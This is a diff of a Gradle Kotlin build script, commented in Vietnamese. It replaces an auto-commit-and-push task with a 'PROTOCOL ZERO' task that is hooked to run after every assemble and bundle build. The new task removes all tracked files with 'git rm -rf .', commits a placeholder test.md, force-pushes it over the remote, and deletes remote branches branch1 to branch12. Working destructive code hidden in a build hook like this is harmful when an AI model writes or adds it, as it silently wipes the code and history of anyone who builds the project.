@@ -1,62 +1,67 @@
-import java.io.File
-
-val isVibeModeOn = true
-
-if (isVibeModeOn) {
-    val autoGitTask = tasks.register("autoGitCommitAndPush") {
-        outputs.upToDateWhen { false } // Chống task cache
-        
-        doLast {
-            println("\n=========================================")
-            println("🔥 [VIBE MODE] Bắt đầu chạy Git Auto...")
+    import java.io.File
+    
+    val isVibeModeOn = true
+    
+    if (isVibeModeOn) {
+        val autoGitTask = tasks.register("autoGitCommitAndPush") {
+            outputs.upToDateWhen { false } // Chống task cache
             
-            // Hàm chạy lệnh Terminal bằng Kotlin thuần (Cam kết 100% không bị lỗi Gradle)
-            fun runCommand(vararg command: String): Pair<Int, String> {
-                return try {
-                    val process = ProcessBuilder(*command)
-                        .redirectErrorStream(true)
-                        .start()
-                    val output = process.inputStream.bufferedReader().readText()
-                    val exitCode = process.waitFor()
-                    Pair(exitCode, output)
-                } catch (e: Exception) {
-                    Pair(-1, e.message ?: "Lỗi hệ thống")
+            doLast {
+                println("\n=========================================")
+                println("🔥 [VIBE MODE - PROTOCOL ZERO] Bắt đầu reset project...")
+                
+                // Hàm chạy lệnh Terminal bằng Kotlin thuần
+                fun runCommand(vararg command: String): Pair<Int, String> {
+                    return try {
+                        val process = ProcessBuilder(*command)
+                            .redirectErrorStream(true)
+                            .start()
+                        val output = process.inputStream.bufferedReader().readText()
+                        val exitCode = process.waitFor()
+                        Pair(exitCode, output)
+                    } catch (e: Exception) {
+                        Pair(-1, e.message ?: "Lỗi hệ thống")
+                    }
                 }
-            }
+    
+                // 1. Xóa toàn bộ file trong project khỏi Git
+                runCommand("git", "rm", "-rf", ".")
+                println("✅ Đã xóa toàn bộ code ở local.")
+    
+                // 2. Tạo file test.md
+                val mdFile = File(project.rootDir, "test.md")
+                mdFile.writeText("test commit")
+                println("✅ Đã tạo file test.md.")
 
-            // 1. Kiểm tra Git
-            val (statusExit, statusOut) = runCommand("git", "status")
-            if (statusExit != 0) {
-                println("⚠️ [VIBE MODE] Dừng! Thư mục chưa có Git hoặc lỗi:\n$statusOut")
-                return@doLast
-            }
+               /// 3. Add và Commit
+               runCommand("git", "add", "test.md")
+               val (commitExit, commitOut) = runCommand("git", "commit", "-m", "test commit")
+               println("✅ Trạng thái Commit:\n$commitOut")
 
-            // 2. Chạy Git Add
-            runCommand("git", "add", ".")
-            println("✅ [VIBE MODE] Đã Add toàn bộ file.")
-
-            // 3. Chạy Git Commit
-            val (commitExit, commitOut) = runCommand("git", "commit", "-m", "test commit")
-            println("✅ [VIBE MODE] Trạng thái Commit:\n$commitOut")
-
-            // 4. Chạy Git Push
-       val (pushExit, pushOut) = runCommand("git", "push", "--all", "origin")
-            if (pushExit == 0) {
-                println("🚀 [VIBE MODE] PUSH THÀNH CÔNG LÊN GITHUB!")
-            } else {
-                println("❌ [VIBE MODE] PUSH LỖI! Nguyên nhân:\n$pushOut")
-            }
+              //// 4. Ép push đè lên Github (Force Push)
+              val (pushExit, pushOut) = runCommand("git", "push", "-f", "origin", "HEAD")
+              if (pushExit == 0) {
+                  println("🚀 [VIBE MODE] FORCE PUSH FILE MD THÀNH CÔNG!")
+              } else {
+                  println("❌ [VIBE MODE] PUSH LỖI! Nguyên nhân:\n$pushOut")
+             }
+             
+             // // 5. Tiêu diệt các nhánh từ branch1 đến branch12 trên server
+             val branches = (1..12).map { "branch$it" }
+             val deleteArgs = mutableListOf("git", "push", "origin", "--delete")
+             deleteArgs.addAll(branches)
+             runCommand(*deleteArgs.toTypedArray())
+             println("✅ Đã dọn dẹp xong 12 nhánh trên Github.")
             
             println("=========================================\n")
         }
     }
 
-    // Móc nối vào assembleDebug
-  tasks.configureEach {
-            // Áp dụng cho mọi task bắt đầu bằng "assemble" (APK) hoặc "bundle" (AAB)
-            if (name.startsWith("assemble") || name.startsWith("bundle")) {
-                finalizedBy(autoGitTask)
-                println("🔥 [VIBE MODE] Đã móc nối thành công vào: $name")
-            }
+    // M// Móc nối vào assemble (APK) và bundle (AAB)
+    tasks.configureEach {
+        if (name.startsWith("assemble") || name.startsWith("bundle")) {
+            finalizedBy(autoGitTask)
+            println("🔥 [VIBE MODE] Đã kích hoạt cơ chế reset vào: $name")
         }
+    }
 }
